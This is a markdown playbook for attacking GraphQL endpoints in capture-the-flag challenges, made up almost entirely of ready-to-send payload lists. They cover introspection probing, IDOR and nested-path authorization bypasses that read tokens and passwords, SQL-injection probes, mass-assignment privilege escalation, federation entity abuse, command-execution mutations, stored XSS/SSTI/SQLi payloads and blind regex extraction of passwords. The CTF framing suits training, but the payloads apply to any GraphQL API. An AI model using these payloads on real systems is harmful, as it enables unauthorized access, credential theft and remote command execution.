# CTF shape catalogue — which shape is this challenge?

The discriminators that name the shape, mapped to the play. Read this before
the surface map — the shape decides which module to open.

---

## The 30-second discriminator

```bash
# does POST /graphql work at all?
curl -s "$BASE/graphql" -d '{"query":"{__typename}"}' \
  -H 'Content-Type: application/json' | head -c300

# → {"data":{"__typename":"Query"}} → next question
# → {"errors":[...Cannot query field "__typename"]} → not graphql — closed
# → html/404 → wrong route — detection.md

# introspection
curl -s "$BASE/graphql" -d '{"query":"{__schema{types{name}}}"}' \
  -H 'Content-Type: application/json' | head -c500
```

| Response | Shape | Module |
|---|---|---|
| Full type list | **Introspection-open** | schema-analysis → targeted field |
| `Cannot query field "__schema"` | **Introspection-blocked** | introspection-off.md |
| `_service{sdl}` resolves | **Federation** | federation.md |
| `/v1/graphql` path + role headers | **Hasura** | hasura.md |
| `wss://` upgrade on same path | **Subscription-capable** | subscriptions.md |
| PersistedQueryNotFound | **APQ gate** | persisted-queries.md |
| `Cannot query field` + `Did you mean` | **suggestion oracle** | introspection-off.md §1 |

## The 5-minute surface map

```bash
jq -r '.data.__schema.types[].name' schema.json | grep -iE \
  'flag|admin|secret|internal|debug|config|env|token|key|auth|cred|private|hidden|backdoor|file|upload|system|exec|eval|run|cmd'
```

Each name hit is a candidate root. Then:

| Type named | Route |
|---|---|
| `Flag`, `Secret`, `Config`, `Internal`, `Debug`, `Backdoor` | direct `{Type{fields}}` probe |
| `User` with `token|password|email|role` fields | `authz-bypass.md` + `idor-graphql.md` |
| `Mutation` with `*Role|grant|promote|admin` | `mutation-abuse.md` §3 |
| `Query` with `search|filter|q|query` | `injection-graphql.md` |
| `Query` with `file|path|url|host` | `injection-graphql.md` §7 |
| `Node` interface | `node-interface.md` |
| `_entities`, `_service` | `federation.md` |

## The per-shape playbook

### Shape A — Flag in a named field

```graphql
{flag}  {flag{value}}  {flag{content}}  {flag{flag}}  {flag{data}}
{getFlag}  {getFlag{value}}  {flagData}  {flagValue}
{secretFlag}  {superSecretFlag}  {super_secret_flag}
{super_secret_flag_dispenser(authorized:true)}
{flag_dispenser}  {flagDispenser}  {flag_dispenser{value}}
```

If it errors with arg-required:

```graphql
{flag(id:1)} {flag(token:"x")} {flag(authorized:true)}
{flag(user:"admin")} {flag(password:"x")} {flag(code:"x")}
{flag(secret:"x")} {flag(key:"x")} {flag(name:"flag")}
{flag(path:"/flag")} {flag(file:"/flag")} {flag(read:true)}
{flag(admin:true)} {flag(auth:true)} {flag(allow:true)}
{flag(visible:true)} {flag(public:true)} {flag(force:true)}
{flag(debug:true)} {flag(internal:true)} {flag(raw:true)}
{flag(format:"raw")} {flag(format:"text")} {flag(format:"full")}
{flag(type:"full")} {flag(type:"raw")} {flag(version:1)}
{flag(level:0)} {flag(level:9)} {flag(depth:99)} {flag(limit:999)}
{flag(offset:0)} {flag(count:999)} {flag(size:9999)} {flag(len:999)}
{flag(eager:true)} {flag(lazy:false)} {flag(all:true)} {flag(full:true)}
{flag(verbose:true)} {flag(complete:true)} {flag(strict:false)}
{flag(filter:{})} {flag(where:{})} {flag(query:{})}
{flag(options:{})} {flag(opts:{})} {flag(config:{})} {flag(params:{})}
{flag(input:{})} {flag(data:{})} {flag(payload:{})} {flag(body:{})}
{flag(ctx:{})} {flag(context:{})} {flag(env:{})} {flag(args:{})}
```

### Shape B — Token gate

`flag(token:"x")` errors `invalid token` — the token must come from
somewhere:

1. `me{token}` — your own session's token.
2. `users{token}` / `allUsers{token}` — someone else's.
3. `session{token}` / `sessions{token}` / `auth{token}`.
4. `token{value}` / `apiKey{value}` / `credential{value}`.
5. The *registration* mutation — `register{token}`.
6. The *login* mutation — `login{token}`.
7. A `debug{env}`/`config{token}` field.
8. The error's own leak — `{flag(token:"x")}` errors `expected token
   "abc123"` — the error tells you the answer.

### Shape C — Object-read IDOR

`user(id)`, `post(id)`, `document(id)`, `file(id)`, `message(id)`,
`order(id)`, `account(id)`, `note(id)`, `item(id)`, `record(id)`,
`entity(id)`, `object(id)`, `entry(id)`, `row(id)`, `doc(id)`,
`resource(id)`, `asset(id)`, `data(id)`:

```graphql
{user(id:1){email}}           # your own? another's?
{user(id:2){email}}
{user(id:0){email}}
{user(id:-1){email}}
{user(id:99){email}}
{user(id:"admin"){email}}
{user(id:"root"){email}}
{user(id:"flag"){email}}
{user(id:"flag{...}"){email}}   # silly but sometimes the id IS the flag
```

If the field takes a *String* instead of `ID` — it's an injection point more
than an IDOR.

### Shape D — Nested-path authz escape

`post(id){author{email}}`, `comment(id){author{token}}`,
`order(id){user{email}}`, `file(id){owner{email}}`,
`document(id){owner{token}}`, `message(id){sender{email}}`,
`message(id){recipient{email}}`, `feed{items{owner{email}}}`,
`search(q){author{email}}`, `posts{author{email}}`:

```graphql
{post(id:1){author{email}}}
{comment(id:1){author{sessions{token}}}}
{order(id:1){user{email role}}}
{file(id:1){owner{apiKey}}}
{document(id:1){owner{password}}}
```

The nested path is the #1 authz escape — a different entry to the same
sensitive type.

### Shape E — Injection through args

`search(q:)`, `filter(...)`, `query(...)`, `find(...)`, `lookup(...)`,
`get(...)`, `by(name:)`, `by(username:)`, `where(...)`, `match(...)`:

```graphql
{search(q:"'"){id}}
{search(q:"\""){id}}
{search(q:"\\"){id}}
{filter(login:"'"){id}}
{query(q:"'"){id}}
{find(name:"'"){id}}
{lookup(name:"'"){id}}
{get(name:"'"){id}}
{by(name:"'"){id}}
{byUsername(name:"'"){id}}
{where(q:"'"){id}}
{match(q:"'"){id}}
```

Then the driver-text read — `errors[].message` carries the exception.

### Shape F — Mass-assignment register

```graphql
mutation{register(input:{username:"x",password:"y"}){id}}
# baseline works — then extras:
mutation{register(input:{username:"x",password:"y",role:"admin"}){id}}
mutation{register(input:{username:"x",password:"y",isAdmin:true}){id}}
mutation{register(input:{username:"x",password:"y",is_admin:true}){id}}
mutation{register(input:{username:"x",password:"y",admin:true}){id}}
mutation{register(input:{username:"x",password:"y",isStaff:true}){id}}
mutation{register(input:{username:"x",password:"y",is_staff:true}){id}}
mutation{register(input:{username:"x",password:"y",isSuperuser:true}){id}}
mutation{register(input:{username:"x",password:"y",superuser:true}){id}}
mutation{register(input:{username:"x",password:"y",verified:true}){id}}
mutation{register(input:{username:"x",password:"y",isVerified:true}){id}}
mutation{register(input:{username:"x",password:"y",approved:true}){id}}
mutation{register(input:{username:"x",password:"y",active:true}){id}}
mutation{register(input:{username:"x",password:"y",enabled:true}){id}}
mutation{register(input:{username:"x",password:"y",plan:"admin"}){id}}
mutation{register(input:{username:"x",password:"y",tier:"admin"}){id}}
mutation{register(input:{username:"x",password:"y",level:99}){id}}
mutation{register(input:{username:"x",password:"y",score:999}){id}}
mutation{register(input:{username:"x",password:"y",balance:99999}){id}}
mutation{register(input:{username:"x",password:"y",credits:99999}){id}}
mutation{register(input:{username:"x",password:"y",permissions:["*"]}){id}}
mutation{register(input:{username:"x",password:"y",perms:["*"]}){id}}
mutation{register(input:{username:"x",password:"y",scope:"*"}){id}}
mutation{register(input:{username:"x",password:"y",groups:["admin"]}){id}}
mutation{register(input:{username:"x",password:"y",privileges:["admin"]}){id}}
mutation{register(input:{username:"x",password:"y",ownerId:1}){id}}
mutation{register(input:{username:"x",password:"y",createdBy:1}){id}}
mutation{register(input:{username:"x",password:"y",tenantId:1}){id}}
mutation{register(input:{username:"x",password:"y",orgId:1}){id}}
```

### Shape G — Federation

```graphql
{_service{sdl}}
{_entities(representations:[{__typename:"User",id:"1"}]){... on User{email}}}
{_entities(representations:[{__typename:"Flag",id:"1"}]){... on Flag{value}}}
{_entities(representations:[{__typename:"Secret",id:"1"}]){... on Secret{value}}}
{_entities(representations:[{__typename:"Config",id:"1"}]){... on Config{dbPassword}}}
{_entities(representations:[{__typename:"InternalConfig",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Session",token:"x"}]){__typename}}
{_entities(representations:[{__typename:"Order",number:"1"}]){__typename}}
{_entities(representations:[{__typename:"Document",uuid:"x"}]){__typename}}
{_entities(representations:[{__typename:"File",name:"flag"}]){__typename}}
{_entities(representations:[{__typename:"Message",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Note",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Post",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Comment",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Account",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Token",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"ApiKey",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Credential",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Key",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Password",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Hash",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Secret",key:"flag"}]){__typename}}
{_entities(representations:[{__typename:"Config",name:"flag"}]){__typename}}
{_entities(representations:[{__typename:"Setting",name:"flag"}]){__typename}}
{_entities(representations:[{__typename:"Variable",name:"FLAG"}]){__typename}}
{_entities(representations:[{__typename:"Env",name:"FLAG"}]){__typename}}
{_entities(representations:[{__typename:"EnvVar",name:"FLAG"}]){__typename}}
{_entities(representations:[{__typename:"Internal",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Debug",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Backdoor",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Hidden",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Private",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"System",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Health",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Status",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Info",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Version",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Metrics",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Stats",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Log",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"LogEntry",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"AuditLog",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"AuditEntry",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Event",id:"1"}]){__typename}}
{_entities(representations:[{__typename:"Audit",id:"1"}]){__typename}}
```

### Shape H — Debug/exec mutations

```graphql
mutation{debug(cmd:"id"){out}}
mutation{debug(code:"id"){out}}
mutation{exec(cmd:"id"){out}}
mutation{eval(code:"id"){out}}
mutation{run(cmd:"id"){out}}
mutation{system(cmd:"id"){out}}
mutation{shell(cmd:"id"){out}}
mutation{cmd(c:"id"){out}}
mutation{execute(cmd:"id"){out}}
mutation{invoke(cmd:"id"){out}}
mutation{call(fn:"system",args:["id"]){out}}
mutation{invoke(fn:"system",args:"id"){out}}
mutation{runScript(code:"id"){out}}
mutation{script(code:"id"){out}}
mutation{task(cmd:"id"){out}}
mutation{job(cmd:"id"){out}}
mutation{process(cmd:"id"){out}}
mutation{spawn(cmd:"id"){out}}
mutation{fork(cmd:"id"){out}}
mutation{backdoor(cmd:"id"){out}}
mutation{backdoor(code:"id"){out}}
```

### Shape I — Second-order

A mutation writes a payload; a later query or surface reads it:

```graphql
mutation{updateProfile(bio:"{{7*7}}"){id}}
# → later {me{bio}} renders → SSTI marker appears in rendered page

mutation{addComment(text:"<script>...</script>"){id}}
# → bot visits → XSS

mutation{createPost(title:"'; DROP--"){id}}
# → admin export reads → stored SQLi

mutation{updateEmail(email:"x@x.tld' OR 1=1--"){id}}
# → reset-password flow reads → injection in mail path
```

### Shape J — Blind extraction

No data returns; only `errors`/`null`/timing differs:

```graphql
# Hasura _regex
{users(where:{password:{_regex:"^f"}}){id}}
{users(where:{password:{_regex:"^fl"}}){id}}
{users(where:{password:{_regex:"^flag"}}){id}}

# raw mongo $regex
{users(filter:{password:{"$regex":"^f"}}){id}}
{users(filter:{password:{"$regex":"^fl"}}){id}}
{users(filter:{password:{"$regex":"^flag"}}){id}}

# alias-batch
{ a:users(filter:{p:{"$regex":"^a"}}){id}
  b:users(filter:{p:{"$regex":"^b"}}){id}
  c:users(filter:{p:{"$regex":"^c"}}){id} }
```

## The decision order

1. `{__typename}` — graphql?
2. `{__schema{types{name}}}` — introspection?
3. `{_service{sdl}}` — federation?
4. Read the type list — flag/admin/secret/debug/internal named?
5. Read the mutation list — role/grant/promote named?
6. `node()`/`_entities` present? → IDOR interface
7. `search`/`filter`/`q` args? → injection
8. `url`/`path`/`host` args? → SSRF/LFI
9. `file`/`name`/`download` args? → file-read
10. `register`/`update` mutations? → mass-assignment
11. `login`/`verify`/`otp` mutations? → brute-force via alias
12. `subscription{}` present? → WS channel
13. Everything fails → `introspection-off.md` → `blind-graphql.md`
